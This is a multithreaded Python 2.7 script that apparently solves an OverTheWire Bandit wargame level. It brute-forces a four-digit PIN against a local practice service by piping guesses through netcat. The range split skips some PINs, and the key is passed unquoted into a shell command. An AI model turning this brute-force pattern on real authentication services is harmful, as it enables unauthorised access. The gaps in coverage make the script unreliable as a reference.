#!/usr/bin/python2.7

from __future__ import print_function
import threading
import time
import datetime
import subprocess
import sys

if len(sys.argv) != 2:
        print('Usage: %s <bandit24_key>' % sys.argv[0])
        sys.exit(1)

# Stop all the threads if pin found
exitFlag = 0

bandit24_key = sys.argv[1]
cmd1 = 'echo ' + bandit24_key + ' '
cmd2 = ' | nc localhost 30002'


# Storing the time when program starts
initTime = time.time()

# Creating thread class
class CheckThread (threading.Thread):
        def __init__(self, _from, _to):
                        threading.Thread.__init__(self)
                        self._from = _from
                        self._to = _to
        def run(self):
                checkPin(self._from, self._to)

# pin check function which takes the range of pin to check
def checkPin (_from, _to):

        # accessing gloable variable exitFlag
        global exitFlag

        # Looping over the range
        for pin in range(_from, _to):
                if exitFlag == 1:
                        print('\r                      ', end='')
                        return

                # Setting up commnad to check pin
                command = cmd1 + str(pin) + cmd2
                proc = subprocess.Popen(command, shell=True,
                                                            stdout=subprocess.PIPE,
                                                        stdin=subprocess.PIPE,
                                                            stderr=subprocess.PIPE)

                # Storing STDOUT 
                result = proc.stdout.read()

                # Checking if pin found
                if result.find('Try again.') == -1:
                        print('\rPin Found: %d Time: %s      \n%s' % (pin, timeFormatter(time.time()), result), end='')
                        exitFlag = 1
                        return
                # checking of key
                elif result.find('Please enter the correct current password') != -1:
                        print('\rPlease enter the correct current password', end='  ')
                        exitFlag = 1
                        return
                else:
                        sys.stdout.write('\rChecking Pin: %d Time: %s' % (pin, timeFormatter(time.time())))
                        sys.stdout.flush()

# To format time in HH:MM:SS
def timeFormatter(sec):
        return str(datetime.timedelta(seconds=int(sec - initTime)))

# Creating 8 threads to check for the pin for different ranges
thread1 = CheckThread(1000, 2000)
thread2 = CheckThread(2000, 3000)
thread3 = CheckThread(3000, 4000)
thread4 = CheckThread(4000, 5000)
thread5 = CheckThread(5000, 6000)
thread6 = CheckThread(7000, 8000)
thread7 = CheckThread(8000, 9000)
thread8 = CheckThread(9000, 10000)

thread1.start()
thread2.start()
thread3.start()
thread4.start()
thread5.start()
thread6.start()
thread7.start()
thread8.start()

